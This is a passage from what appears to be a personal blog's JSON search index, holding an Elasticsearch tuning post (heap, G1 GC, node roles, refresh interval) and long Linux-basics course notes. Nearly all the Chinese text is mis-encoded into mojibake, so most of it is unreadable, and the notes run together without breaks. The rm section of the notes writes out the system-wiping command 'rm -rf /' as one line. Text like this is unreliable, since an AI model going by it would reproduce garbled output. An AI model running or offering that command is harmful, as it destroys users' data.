/wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"linux","slug":"linux","permalink":"https://wangxiuwen.github.io/tags/linux/"}],"author":"wangxiuwen"},{"title":"elasticsearchä¸‰ä¸ªé‡è¦çš„ä¼˜åŒ–","slug":"history/tech/5953c4d0c2b92f5665eed9a9","date":"2015-12-24T18:22:45.000Z","updated":"2020-11-29T01:42:08.751Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed9a9/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed9a9/","excerpt":"","text":"1ã€å†…å­˜ä¼˜åŒ–åœ¨bin/elasticsearch.in.shä¸­è¿›è¡Œé…ç½®ä¿®æ”¹é…ç½®é¡¹ä¸ºå°½é‡å¤§çš„å†…å­˜ï¼šES_MIN_MEM=8gES_MAX_MEM=8gä¸¤è€…æœ€å¥½æ”¹æˆä¸€æ ·çš„ï¼Œå¦åˆ™å®¹æ˜“å¼•å‘é•¿æ—¶é—´GCï¼ˆstop-the-worldï¼‰elasticsearché»˜è®¤ä½¿ç”¨çš„GCæ˜¯CMS GCå¦‚æœä½ çš„å†…å­˜å¤§å°è¶…è¿‡6Gï¼ŒCMSæ˜¯ä¸ç»™åŠ›çš„ï¼Œå®¹æ˜“å‡ºç°stop-the-worldå»ºè®®ä½¿ç”¨G1 GCæ³¨é‡Šæ‰ï¼š[code]JAVA_OPTS=â€JAVA_OPTS -XX:+UseParNewGCâ€ JAVA_OPTS=â€JAVA_OPTS -XX:+UseConcMarkSweepGCâ€JAVA_OPTS=â€JAVA_OPTS -XX:CMSInitiatingOccupancyFraction=75â€³ JAVA_OPTS=â€JAVA_OPTS -XX:+UseCMSInitiatingOccupancyOnlyâ€[/code]ä¿®æ”¹ä¸ºï¼š[code]JAVA_OPTS=â€JAVA_OPTS -XX:+UseG1GCâ€ JAVA_OPTS=â€JAVA_OPTS -XX:MaxGCPauseMillis=200â€³[/code]å¦‚æœG1 GCä¼˜ç‚¹æ˜¯å‡å°‘stop-the-worldåœ¨å‡ ç‡ï¼Œä½†æ˜¯CPUå æœ‰ç‡é«˜ã€‚éœ€è¦æ›´ä¼˜åŒ–çš„æ€§èƒ½ï¼Œä½ å¯ä»¥å‚è€ƒhttp://www.oracle.com/webfolder/technetwork/tutorials/obe/java/G1GettingStarted/index.html2ã€åˆç†é…ç½®ä¸»èŠ‚ç‚¹å’Œæ•°æ®èŠ‚ç‚¹é…ç½®æ–‡ä»¶ï¼šconf/elasticsearch.yamlnode.master: truenode.data: true1) å½“masterä¸ºfalseï¼Œè€Œdataä¸ºtrueæ—¶ï¼Œä¼šå¯¹è¯¥èŠ‚ç‚¹äº§ç”Ÿä¸¥é‡è´Ÿè·ï¼›2) å½“masterä¸ºtrueï¼Œè€Œdataä¸ºfalseæ—¶ï¼Œè¯¥èŠ‚ç‚¹ä½œä¸ºä¸€ä¸ªåè°ƒè€…ï¼›3) å½“masterä¸ºfalseï¼Œdataä¹Ÿä¸ºfalseæ—¶ï¼Œè¯¥èŠ‚ç‚¹å°±å˜æˆäº†ä¸€ä¸ªè´Ÿè½½å‡è¡¡å™¨ã€‚3ã€è®¾ç½®åˆç†çš„åˆ·æ–°æ—¶é—´å»ºç«‹çš„ç´¢å¼•ï¼Œä¸ä¼šç«‹é©¬æŸ¥åˆ°ï¼Œè¿™æ˜¯ä¸ºä»€ä¹ˆelasticsearchä¸ºnear-real-timeçš„åŸå› éœ€è¦é…ç½®index.refresh_intervalå‚æ•°ï¼Œé»˜è®¤æ˜¯1sã€‚ä½ å¯ä»¥åƒhttp://zhaoyanblog.com/archives/299.htmlæ–‡ä»¶ä¸­ä¸€æ ·ï¼Œè°ƒç”¨æ¥å£é…ç½®ä¹Ÿå¯ä»¥ç›´æ¥å†™åˆ°conf/elasticsearch.yamlæ–‡ä»¶ä¸­index.refresh_intervalï¼š1sè¿™æ ·æ‰€æœ‰æ–°å»ºçš„ç´¢å¼•éƒ½ä½¿ç”¨è¿™ä¸ªåˆ·æ–°é¢‘ç‡ã€‚é™¤éæ³¨æ˜ï¼Œhttp://zhaoyanblog.com/æ–‡ç« å‡ä¸ºåŸåˆ›ï¼Œè½¬è½½è¯·ä»¥é“¾æ¥å½¢å¼æ ‡æ˜æœ¬æ–‡åœ°å€æœ¬æ–‡åœ°å€ï¼šhttp://zhaoyanblog.com/archives/319.html","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"elasticsearch","slug":"elasticsearch","permalink":"https://wangxiuwen.github.io/tags/elasticsearch/"}],"author":"wangxiuwen"},{"title":"é©¬å“¥linux åŸºç¡€","slug":"history/tech/5953c4d0c2b92f5665eed9a1","date":"2015-12-24T02:14:52.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed9a1/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed9a1/","excerpt":"","text":"è®¡ç®—æœºä½“ç³»ç»“æ„ï¼šè¿ç®—å™¨æ§åˆ¶å™¨å­˜å‚¨å™¨ï¼Œå†…å­˜ï¼Œç¼–å€è¾“å‡ºè®¾å¤‡è¾“å…¥è®¾å¤‡POSTï¼šBIOSè‡ªä¸¾ç¨‹åºï¼šæŒ‡ä»¤+æ•°æ®RAMï¼šROMï¼šç¡¬ä»¶æ¶æ„ï¼šARMx86x64å®‰è…¾alphaUltraSparcPowerM68000, M68KPowerPCOS:WindowsLinuxUnixHP-UXSolarisAIXSCO UNIXUnixwareOS/2å†…æ ¸åŠŸèƒ½ï¼šè¿›ç¨‹ç®¡ç†å†…å­˜ç®¡ç†æ–‡ä»¶ç³»ç»Ÿç½‘ç»œåŠŸèƒ½ç¡¬ä»¶é©±åŠ¨å®‰å…¨æœºåˆ¶æ‰¹å¤„ç†ç³»ç»Ÿjobs1$$$$$$jobs2jobs2jobs2$$$$$$$GE, Bell, MITMainFrameæ±‡ç¼–è¯­è¨€ï¼šMulticsKen,Space TravelDEC:PDP-11, PDP-7VAX --&gt; vmsUnics --&gt; UnixBâ€“&gt;CPDP-Bill Joy: BSRGBSD: Berkeley System DistributionSystem V81, Microsoftï¼ŒXenixCP/Mâ€“&gt;DOSjobsXerox: å¤å°æœºPARKFreeBSDOpenBSDNetBSDSun MicroSystemSun OS --&gt; SolarisCSHWindows NT ServerAndrew: MinixLinus: Linux80, Stallman, FreedomGNU: GNU is Not UnixGPL: General Public LicenseLGPL: LesserGPLv2GPLv3BSDApacheå¼€æºï¼šå¼€æ”¾æºä»£ç è‡ªç”±ï¼šè‡ªç”±è·å–ï¼Œè‡ªç”±ä¿®æ”¹ï¼Œè‡ªç”±å­¦ä¹ Emacs: æ–‡æœ¬ç¼–è¾‘å™¨gcc: GNU C Complierbash:Linuxï¼šglibc, gcc,GNU/Linuxæºä»£ç ï¼š C --&gt; ç¼–è¯‘æˆäºŒè¿›åˆ¶ (äº¤å‰ç¼–è¯‘)ABIï¼šApplication Binary InterfaceRedHatSLSDebianSUSE --&gt; Novell (Netware), OpenSUSEå‘è¡Œå•†ï¼š releasekernel: 2wDebian, dptRedHat, rpmUbuntu: MintCentOS: Community ENTerprise OSFedora:Mandrivalinux ip=172.16.X.1 netmask=255.255.0.0 gateway=172.16.0.1 dns=172.16.0.1 ks=http://172.16.0.1/class.cfgLinux: 0.1, 1.0, 2.0, 2.2, 2.4, 2.6, 3.0, 3.7RHEL 3.0, 4.0, 5.0, 6.0Linuxçš„åŸºæœ¬åŸåˆ™ï¼š1ã€ç”±ç›®çš„å•ä¸€çš„å°ç¨‹åºç»„æˆï¼›ç»„åˆå°ç¨‹åºå®Œæˆå¤æ‚ä»»åŠ¡ï¼›2ã€ä¸€åˆ‡çš†æ–‡ä»¶ï¼›3ã€å°½é‡é¿å…æ•è·ç”¨æˆ·æ¥å£ï¼›4ã€é…ç½®æ–‡ä»¶ä¿å­˜ä¸ºçº¯æ–‡æœ¬æ ¼å¼ï¼›GUIæ¥å£ï¼šCLIæ¥å£ï¼šå‘½ä»¤æç¤ºç¬¦ï¼Œprompt, bash(shell)#: root$: æ™®é€šç”¨æˆ·å‘½ä»¤ï¼šå‘½ä»¤æ ¼å¼ï¼šå‘½ä»¤ é€‰é¡¹ å‚æ•°é€‰é¡¹ï¼šçŸ­é€‰é¡¹ï¼š -å¤šä¸ªé€‰é¡¹å¯ä»¥ç»„åˆï¼š-a -b = -abé•¿é€‰é¡¹ï¼š â€“å‚æ•°ï¼šå‘½ä»¤çš„ä½œç”¨å¯¹è±¡ä½¿ç”¨å‡­è¯ï¼šroot, redhatè™šæ‹Ÿç»ˆç«¯(terminal)ï¼šCtrl+Alt+F1-F6GUI:Gnome: CKDE: C++XFaceCLI:shbashcshzshkshtcshroot, student, vistorsu: switch user su ç”¨æˆ·å passwdå¯†ç å¤æ‚æ€§è§„åˆ™ï¼š10^636^662^6100^6Linuxedu@126.com1ã€ä½¿ç”¨4ç§ç±»åˆ«å­—ç¬¦ä¸­è‡³å°‘3ç§ï¼›2ã€è¶³å¤Ÿé•¿ï¼Œå¤§äº7ä½ï¼›3ã€ä½¿ç”¨éšæœºå­—ç¬¦ä¸²ï¼›4ã€å®šæœŸæ›´æ¢ï¼›5ã€å¾ªç¯å‘¨æœŸè¶³å¤Ÿå¤§ï¼›123456123456RHCE+RHCA+shellç¼–ç¨‹+MySQL+Webé›†ç¾¤+NoSQL+Hadoop+Hbase+Openstack172.16.100.177192.168.0.1GNU: GNU is Not Unix.GPL: General Public Licenseï¼Œé€šç”¨å…¬å…±è®¸å¯è¯ï¼Œç‰ˆæƒCopyright, Copyleftå¼€æºåå®šLGPLï¼šlesserGPLv2GPLv3Shell:GUI: Graphic User InterfaceWindowsX-WindowGnomeKDEXfaceCLI: Command Line InterfaceshbashcshkshzshtcshGoogle:linux filetype:pdflinux site:ibm.comgoogle hackIDE:login:ç”¨æˆ·åï¼šç”¨æˆ·IDè®¤è¯æœºåˆ¶ï¼šAuthenticationæˆæƒï¼šAuthorizationå®¡è®¡ï¼šAudition (æ—¥å¿—)prompt,å‘½ä»¤æç¤ºç¬¦:å‘½ä»¤ï¼šmagic number: é­”æ•°shebang#!/bin/bash command optionsâ€¦ argumentsâ€¦é€‰é¡¹ï¼šçŸ­é€‰é¡¹é•¿é€‰é¡¹å‚æ•°ï¼šlist: lsåˆ—å‡ºï¼Œåˆ—è¡¨ç›®å½•ï¼šæ–‡ä»¶ï¼Œè·¯å¾„æ˜ å°„è·¯å¾„ï¼šä»æŒ‡å®šèµ·å§‹ç‚¹åˆ°ç›®çš„åœ°æ‰€ç»è¿‡ä½ç½®æ–‡ä»¶ç³»ç»Ÿï¼šfile systemåˆ—å‡ºæŒ‡å®šè·¯å¾„ä¸‹çš„æ–‡ä»¶ç›®å½•ï¼šworking directory, current directorypwd: Printing Working directoryls-lï¼šé•¿æ ¼å¼æ–‡ä»¶ç±»å‹ï¼š-ï¼šæ™®é€šæ–‡ä»¶ (f)d: ç›®å½•æ–‡ä»¶b: å—è®¾å¤‡æ–‡ä»¶ (block)c: å­—ç¬¦è®¾å¤‡æ–‡ä»¶ (character)l: ç¬¦å·é“¾æ¥æ–‡ä»¶(symbolic link file)p: å‘½ä»¤ç®¡é“æ–‡ä»¶(pipe)s: å¥—æ¥å­—æ–‡ä»¶(socket)æ–‡ä»¶æƒé™ï¼š9ä½ï¼Œæ¯3ä½ä¸€ç»„ï¼Œæ¯ä¸€ç»„ï¼šrwx(è¯»ï¼Œå†™ï¼Œæ‰§è¡Œ), râ€“æ–‡ä»¶ç¡¬é“¾æ¥çš„æ¬¡æ•°æ–‡ä»¶çš„å±ä¸»(owner)æ–‡ä»¶çš„å±ç»„(group)æ–‡ä»¶å¤§å°(size)ï¼Œå•ä½æ˜¯å­—èŠ‚æ—¶é—´æˆ³(timestamp)ï¼šæœ€è¿‘ä¸€æ¬¡è¢«ä¿®æ”¹çš„æ—¶é—´è®¿é—®:accessä¿®æ”¹:modifyï¼Œæ–‡ä»¶å†…å®¹å‘ç”Ÿäº†æ”¹å˜æ”¹å˜:changeï¼Œmetadataï¼Œå…ƒæ•°æ®-hï¼šåšå•ä½è½¬æ¢-a: æ˜¾ç¤ºä»¥.å¼€å¤´çš„éšè—æ–‡ä»¶. è¡¨ç¤ºå½“å‰ç›®å½•â€¦ è¡¨ç¤ºçˆ¶ç›®å½•-A-d: æ˜¾ç¤ºç›®å½•è‡ªèº«å±æ€§-i: index node, inode-r: é€†åºæ˜¾ç¤º-R: é€’å½’(recursive)æ˜¾ç¤ºcd: change directoryå®¶ç›®å½•ï¼Œä¸»ç›®å½•, home directorycd ~USERNAME: è¿›å…¥æŒ‡å®šç”¨æˆ·çš„å®¶ç›®å½•cd -:åœ¨å½“å‰ç›®å½•å’Œå‰ä¸€æ¬¡æ‰€åœ¨çš„ç›®å½•ä¹‹é—´æ¥å›åˆ‡æ¢å‘½ä»¤ç±»å‹ï¼šå†…ç½®å‘½ä»¤(shellå†…ç½®)ï¼Œå†…éƒ¨ï¼Œå†…å»ºå¤–éƒ¨å‘½ä»¤ï¼šåœ¨æ–‡ä»¶ç³»ç»Ÿçš„æŸä¸ªè·¯å¾„ä¸‹æœ‰ä¸€ä¸ªä¸å‘½ä»¤åç§°ç›¸åº”çš„å¯æ‰§è¡Œæ–‡ä»¶ç¯å¢ƒå˜é‡ï¼šå‘½åçš„å†…å­˜ç©ºé—´å˜é‡èµ‹å€¼NAME=JerryPATH: ä½¿ç”¨å†’å·åˆ†éš”çš„è·¯å¾„ O(1) type: æ˜¾ç¤ºæŒ‡å®šå±äºå“ªç§ç±»å‹dateï¼šæ—¶é—´ç®¡ç†Linux: rtcç¡¬ä»¶æ—¶é’Ÿ ç³»ç»Ÿæ—¶é’Ÿ è·å¾—å‘½ä»¤çš„ä½¿ç”¨å¸®åŠ©ï¼šå†…éƒ¨å‘½ä»¤ï¼šhelp COMMANDå¤–éƒ¨å‘½ä»¤ï¼šCOMMAND --helpå‘½ä»¤æ‰‹å†Œï¼šmanualman COMMANDwhatis COMMANDåˆ†ç« èŠ‚ï¼š1ï¼šç”¨æˆ·å‘½ä»¤(/bin, /usr/bin, /usr/local/bin)2ï¼šç³»ç»Ÿè°ƒç”¨3ï¼šåº“ç”¨æˆ·4ï¼šç‰¹æ®Šæ–‡ä»¶(è®¾å¤‡æ–‡ä»¶)5ï¼šæ–‡ä»¶æ ¼å¼(é…ç½®æ–‡ä»¶çš„è¯­æ³•)6ï¼šæ¸¸æˆ7ï¼šæ‚é¡¹(Miscellaneous)8: ç®¡ç†å‘½ä»¤(/sbin, /usr/sbin, /usr/local/sbin)&lt;&gt;ï¼šå¿…é€‰[]ï¼šå¯é€‰â€¦ï¼šå¯ä»¥å‡ºç°å¤šæ¬¡|ï¼šå¤šé€‰ä¸€{}ï¼šåˆ†ç»„MANï¼šNAMEï¼šå‘½ä»¤åç§°åŠåŠŸèƒ½ç®€è¦è¯´æ˜SYNOPSISï¼šç”¨æ³•è¯´æ˜ï¼ŒåŒ…æ‹¬å¯ç”¨çš„é€‰é¡¹DESCRIPTIONï¼šå‘½ä»¤åŠŸèƒ½çš„è¯¦å°½è¯´æ˜ï¼Œå¯èƒ½åŒ…æ‹¬æ¯ä¸€ä¸ªé€‰é¡¹çš„æ„ä¹‰OPTIONSï¼šè¯´æ˜æ¯ä¸€ä¸ªé€‰é¡¹çš„æ„ä¹‰FILESï¼šæ­¤å‘½ä»¤ç›¸å…³çš„é…ç½®æ–‡ä»¶BUGSï¼šEXAMPLESï¼šä½¿ç”¨ç¤ºä¾‹SEE ALSOï¼šå¦å¤–å‚ç…§ç¿»å±ï¼šå‘åç¿»ä¸€å±ï¼šSPACEå‘å‰ç¿»ä¸€å±ï¼šbå‘åç¿»ä¸€è¡Œï¼šENTERå‘å‰ç¿»ä¸€è¡Œï¼škæŸ¥æ‰¾ï¼š/KEYWORD: å‘ån: ä¸‹ä¸€ä¸ªNï¼šå‰ä¸€ä¸ª?KEYWORDï¼šå‘å‰n: ä¸‹ä¸€ä¸ªNï¼šå‰ä¸€ä¸ªq: é€€å‡ºåœ¨çº¿æ–‡æ¡£ï¼šinfo COMMANDæ–‡æ¡£ï¼š/usr/share/docgoogleapache, hadoopç»ƒä¹ ï¼šä½¿ç”¨dateå•ç‹¬è·å–ç³»ç»Ÿå½“å‰çš„å¹´ä»½ã€æœˆä»½ã€æ—¥ã€å°æ—¶ã€åˆ†é’Ÿã€ç§’hwclock-w:-s:cal: calendarç»ƒä¹ ï¼š1ã€echoæ˜¯å†…éƒ¨å‘½ä»¤è¿˜æ˜¯å¤–éƒ¨å‘½ä»¤ï¼Ÿ2ã€å…¶ä½œç”¨ï¼Ÿ3ã€å¦‚ä½•æ˜¾ç¤ºâ€œThe year is 2013. Today is 26.â€ä¸ºä¸¤è¡Œï¼Ÿè½¬ä¹‰ï¼Œé€ƒé€¸ç»ƒä¹ ï¼š1ã€printfæ˜¯å†…éƒ¨å‘½ä»¤è¿˜æ˜¯å¤–éƒ¨å‘½ä»¤ï¼Ÿ2ã€å…¶ä½œç”¨ï¼Ÿ3ã€å¦‚ä½•æ˜¾ç¤ºâ€œThe year is 2013. Today is 26.â€ä¸ºä¸¤è¡Œï¼Ÿfileå‘½ä»¤åŠå…¶ç”¨æ³•ã€‚Windows: PELinux: ELFæ–‡ä»¶ç³»ç»Ÿï¼šrootfs: æ ¹æ–‡ä»¶ç³»ç»ŸFHSï¼šLinux/boot: ç³»ç»Ÿå¯åŠ¨ç›¸å…³çš„æ–‡ä»¶ï¼Œå¦‚å†…æ ¸ã€initrdï¼Œä»¥åŠgrub(bootloader)/dev: è®¾å¤‡æ–‡ä»¶è®¾å¤‡æ–‡ä»¶ï¼šå—è®¾å¤‡ï¼šéšæœºè®¿é—®ï¼Œæ•°æ®å—å­—ç¬¦è®¾å¤‡ï¼šçº¿æ€§è®¿é—®ï¼ŒæŒ‰å­—ç¬¦ä¸ºå•ä½è®¾å¤‡å·ï¼šä¸»è®¾å¤‡å·ï¼ˆmajorï¼‰å’Œæ¬¡è®¾å¤‡å·ï¼ˆminorï¼‰/etcï¼šé…ç½®æ–‡ä»¶/homeï¼šç”¨æˆ·çš„å®¶ç›®å½•ï¼Œæ¯ä¸€ä¸ªç”¨æˆ·çš„å®¶ç›®å½•é€šå¸¸é»˜è®¤ä¸º/home/USERNAME/rootï¼šç®¡ç†å‘˜çš„å®¶ç›®å½•ï¼›/libï¼šåº“æ–‡ä»¶é™æ€åº“, .aåŠ¨æ€åº“ï¼Œ .dll, .so (shared object)/lib/modulesï¼šå†…æ ¸æ¨¡å—æ–‡ä»¶/mediaï¼šæŒ‚è½½ç‚¹ç›®å½•ï¼Œç§»åŠ¨è®¾å¤‡/mntï¼šæŒ‚è½½ç‚¹ç›®å½•ï¼Œé¢å¤–çš„ä¸´æ—¶æ–‡ä»¶ç³»ç»Ÿ/optï¼šå¯é€‰ç›®å½•ï¼Œç¬¬ä¸‰æ–¹ç¨‹åºçš„å®‰è£…ç›®å½•/procï¼šä¼ªæ–‡ä»¶ç³»ç»Ÿï¼Œå†…æ ¸æ˜ å°„æ–‡ä»¶/sysï¼šä¼ªæ–‡ä»¶ç³»ç»Ÿï¼Œè·Ÿç¡¬ä»¶è®¾å¤‡ç›¸å…³çš„å±æ€§æ˜ å°„æ–‡ä»¶/tmpï¼šä¸´æ—¶æ–‡ä»¶, /var/tmp/varï¼šå¯å˜åŒ–çš„æ–‡ä»¶/bin: å¯æ‰§è¡Œæ–‡ä»¶, ç”¨æˆ·å‘½ä»¤/sbinï¼šç®¡ç†å‘½ä»¤/usrï¼šshared, read-only/usr/bin/usr/sbin/usr/lib/usr/localï¼š/usr/local/bin/usr/local/sbin/usr/local/libå‘½åè§„åˆ™ï¼š1ã€é•¿åº¦ä¸èƒ½è¶…è¿‡255ä¸ªå­—ç¬¦ï¼›2ã€ä¸èƒ½ä½¿ç”¨/å½“æ–‡ä»¶å3ã€ä¸¥æ ¼åŒºåˆ†å¤§å°å†™ç›¸å¯¹è·¯å¾„ï¼šç»å¯¹è·¯å¾„ï¼šæ–‡ä»¶ç®¡ç†ç›®å½•ç®¡ç†lscdpwdmkdirï¼šåˆ›å»ºç©ºç›®å½•-p:-v: verbose/root/x/y/z/mnt/test/x/m,ymkdir -pv /mnt/test/x/m /mnt/test/ymkdir -pv /mnt/test/{x/m,y}~USERNAMEå‘½ä»¤è¡Œå±•å¼€ï¼š/mnt/test2/a_b, a_c, d_b, d_c(a+d)(b+c)=ab+ac+db+dc{a,d}_{b,c} treeï¼šæŸ¥çœ‹ç›®å½•æ ‘åˆ é™¤ç›®å½•ï¼šrmdir (remove directory)åˆ é™¤ç©ºç›®å½•-pæ–‡ä»¶åˆ›å»ºå’Œåˆ é™¤ touch-a -m -t -c statåˆ›å»ºæ–‡ä»¶ï¼Œå¯ä»¥ä½¿ç”¨æ–‡ä»¶ç¼–è¾‘å™¨ASCII:128ä¸åŒçš„å­—ç¬¦ï¼šäºŒè¿›åˆ¶ï¼š2^6=0,632^7=0,127000 0000 - 111 1111ASCII:0000 1001: t2^16: 65536æ ‡å‡†ï¼šGB18030, GBK, GB2312ï¼ŒUnicode0000 1001 0000 1110ï¼šä¸Šï¼Œ å«nanoåˆ é™¤æ–‡ä»¶ï¼šrm-i-f-rrm -rf /ç»ƒä¹ ï¼š1ã€åˆ›å»ºç›®å½•(1)åœ¨/mntä¸‹åˆ›å»ºbootå’Œsysrootï¼›(2)åœ¨/mnt/bootä¸‹åˆ›å»ºgrubï¼›(3)åœ¨/mnt/sysrootä¸‹åˆ›å»ºproc, sys, bin, sbin, lib, usr, var, etc, dev, home, root, tmpa)åœ¨/mnt/sysroot/usrä¸‹åˆ›å»ºbin, sbin, libb)åœ¨/mnt/sysroot/libä¸‹åˆ›å»ºmodulesc)åœ¨/mnt/sysroot/varä¸‹åˆ›å»ºrun, log, lockd)åœ¨/mnt/sysroot/etcä¸‹åˆ›å»ºinit.då¤åˆ¶å’Œç§»åŠ¨æ–‡ä»¶cpï¼š copycp SRC DEST-r-i-f-p-aï¼šå½’æ¡£å¤åˆ¶ï¼Œå¸¸ç”¨äºå¤‡ä»½cp file1 file2 file3ä¸€ä¸ªæ–‡ä»¶åˆ°ä¸€ä¸ªæ–‡ä»¶å¤šä¸ªæ–‡ä»¶åˆ°ä¸€ä¸ªç›®å½•cp /etc/{passwd,inittab,rc.d/rc.sysinit} /tmp/mv: moveç§»åŠ¨æ–‡ä»¶mv SRC DESTmv -t DEST SRCinstall-d DIRECOTRY â€¦ ï¼šåˆ›å»ºç›®å½•SRC DESTinstall -t DIRECTORY SRCâ€¦ä½œä¸š1ï¼š1ã€åˆ›å»ºç›®å½•/backup mkdir -v /backup2ã€å¤åˆ¶ç›®å½•/etcè‡³/backupç›®å½•ä¸­ï¼Œå¹¶é‡å‘½åä¸ºâ€œetc-å½“å‰æ—¥æœŸâ€ï¼Œå¦‚etc-2013-02-26ï¼›è¦æ±‚ä¿ç•™æ–‡ä»¶åŸæ¥çš„å±æ€§ï¼Œä¿æŒé“¾æ¥æ–‡ä»¶ï¼›cp-r-p-d cp -a /etc /backup/etc-2013-02-28å‘½ä»¤æ›¿æ¢3ã€å¤åˆ¶æ–‡ä»¶/etc/inittabä¸º/tmp/inittab.newï¼Œå¹¶åˆ é™¤inittab.newæ–‡ä»¶çš„åä¸¤è¡Œï¼› cp /etc/inittab /tmp/inittab.new nano /tmp/inittab.newä½œä¸š2ï¼š1ã€æ€è€ƒï¼šlså‘½ä»¤æ˜¯å¦å¯ä»¥æ˜¾ç¤ºæŸç›®å½•çš„æ•´ä½“å¤§å°ï¼Œå³åŒ…æ‹¬å…¶å†…éƒ¨çš„æ‰€æœ‰æ–‡ä»¶çš„æ•´ä½“å¤§å°ï¼Ÿ2ã€é€šè¿‡å¸®åŠ©æ‰‹å†Œï¼Œå­¦ä¹ ä½¿ç”¨duå‘½ä»¤ï¼› du-s -h 3ã€é€šè¿‡å¸®åŠ©ï¼Œå­¦ä¹ readå‘½ä»¤ï¼›å˜é‡ï¼šå†…å­˜ç©ºé—´ï¼Œæœ‰åç§°å˜é‡èµ‹å€¼ï¼šå˜é‡æ›¿æ¢ä½œä¸š3ï¼šæè¿°GPL, BSD, Apacheä¸‰ä¸ªå¼€æºåå®šçš„å¤§ä½“è”ç³»åŠåŒºåˆ«ã€‚è‡ªç”±è½¯ä»¶å¼€æºåå®šï¼Œç‰ˆæƒæè¿°ä½œä¸š4ï¼š1ã€å¦‚ä½•è·å–Linuxå½“å‰æœ€æ–°çš„å†…æ ¸ç‰ˆæœ¬å·ï¼Ÿwww.kernel.org2ã€åˆ—å‡ºä½ æ‰€äº†è§£çš„Linuxå‘è¡Œç‰ˆï¼Œå¹¶è¯´æ˜å…¶è·ŸLinuxå†…æ ¸çš„å…³ç³»ã€‚Linux, GNU: GNU/Linux, æºä»£ç å‘è¡Œç‰ˆï¼šFedora, RedHat(CentOS), SUSE, Debian(Ubuntu, Mint), Gentoo, LFS(Linux From Scratch) C, Tom, AMD, Jerry,RedHat: é€šç”¨æ ¼å¼å¥”è…¾ï¼šè¿è¡Œç¨‹åºè®¾å¤‡ç®¡ç†è½¯ä»¶ç®¡ç†è¿›ç¨‹ç®¡ç†ç½‘ç»œç®¡ç†ç›®å½•ç®¡ç†ï¼šlsã€cdã€pwdã€mkdirã€rmdirã€treeæ–‡ä»¶ç®¡ç†ï¼štouchã€statã€fileã€rmã€cpã€mvã€nanoæ—¥æœŸæ—¶é—´ï¼šdateã€clockã€hwclockã€calæŸ¥çœ‹æ–‡æœ¬ï¼šcatã€tacã€moreã€lessã€headã€tailcatï¼šè¿æ¥å¹¶æ˜¾ç¤º-n-ECtrl+cåˆ†å±æ˜¾ç¤ºï¼šmoreã€lessmore: å‘åç¿»less:head:æŸ¥çœ‹å‰nè¡Œtail:æŸ¥çœ‹ånè¡Œ-ntail -f: æŸ¥çœ‹æ–‡ä»¶å°¾éƒ¨ï¼Œä¸é€€å‡ºï¼Œç­‰å¾…æ˜¾ç¤ºåç»­è¿½åŠ è‡³æ­¤æ–‡ä»¶çš„æ–°å†…å®¹ï¼›æ–‡æœ¬å¤„ç†ï¼šcutã€joinã€sedã€awkdatabase:æ•°æ®åº“å…³ç³»å‹æ•°æ®åº“ï¼šè¡¨ï¼šäºŒç»´è¡¨æ–‡æœ¬æ–‡ä»¶ï¼šTom:23:male:2013/05/06cut:-d: æŒ‡å®šå­—æ®µåˆ†éš”ç¬¦ï¼Œé»˜è®¤æ˜¯ç©ºæ ¼-f: æŒ‡å®šè¦æ˜¾ç¤ºçš„å­—æ®µ-f 1,3-f 1-3æ–‡æœ¬æ’åºï¼šsort-nï¼šæ•°å€¼æ’åº-r: é™åº-t: å­—æ®µåˆ†éš”ç¬¦-k: ä»¥å“ªä¸ªå­—æ®µä¸ºå…³é”®å­—è¿›è¡Œæ’åº-u: æ’åºåç›¸åŒçš„è¡Œåªæ˜¾ç¤ºä¸€æ¬¡-f: æ’åºæ—¶å¿½ç•¥å­—ç¬¦å¤§å°å†™uniq:-c: æ˜¾ç¤ºæ–‡ä»¶ä¸­è¡Œé‡å¤çš„æ¬¡æ•°-d: åªæ˜¾ç¤ºé‡å¤çš„è¡Œæ–‡æœ¬ç»Ÿè®¡ï¼šwc (word count)-l-w-c-Lå­—ç¬¦å¤„ç†å‘½ä»¤ï¼štr â€”â€” è½¬æ¢æˆ–åˆ é™¤å­—ç¬¦tr â€¦ SET1-d: åˆ é™¤å‡ºç°åœ¨å­—ç¬¦é›†ä¸­çš„æ‰€æœ‰å­—ç¬¦tr ab ABbashåŠå…¶ç‰¹æ€§ï¼šshell: å¤–å£³GUIï¼šGnome, KDE, XfceCLI: sh, csh, ksh, bash, tcsh, zshroot, studentç¨‹åºï¼šè¿›ç¨‹è¿›ç¨‹ï¼šåœ¨æ¯ä¸ªè¿›ç¨‹çœ‹æ¥ï¼Œå½“å‰ä¸»æœºä¸Šåªå­˜åœ¨å†…æ ¸å’Œå½“å‰è¿›ç¨‹è¿›ç¨‹æ˜¯ç¨‹åºçš„å‰¯æœ¬ï¼Œè¿›ç¨‹æ˜¯ç¨‹åºæ‰§è¡Œå®ä¾‹ç”¨æˆ·å·¥ä½œç¯å¢ƒï¼šbash:#$tom, jerry shellï¼Œå­shellbashâ€“bashbash:1ã€å‘½ä»¤å†å²ã€å‘½ä»¤è¡¥å…¨2ã€ç®¡é“ã€é‡å®šå‘3ã€å‘½ä»¤åˆ«å4ã€å‘½ä»¤è¡Œç¼–è¾‘5ã€å‘½ä»¤è¡Œå±•å¼€6ã€æ–‡ä»¶åé€šé…7ã€å˜é‡8ã€ç¼–ç¨‹å‘½ä»¤è¡Œç¼–è¾‘ï¼šå…‰æ ‡è·³è½¬ï¼šCtrl+aï¼šè·³åˆ°å‘½ä»¤è¡Œé¦–Ctrl+eï¼šè·³åˆ°å‘½ä»¤è¡Œå°¾Ctrl+u: åˆ é™¤å…‰æ ‡è‡³å‘½ä»¤è¡Œé¦–çš„å†…å®¹Ctrl+k: åˆ é™¤å…‰æ ‡è‡³å‘½ä»¤è¡Œå°¾çš„å†…å®¹Ctrl+l: 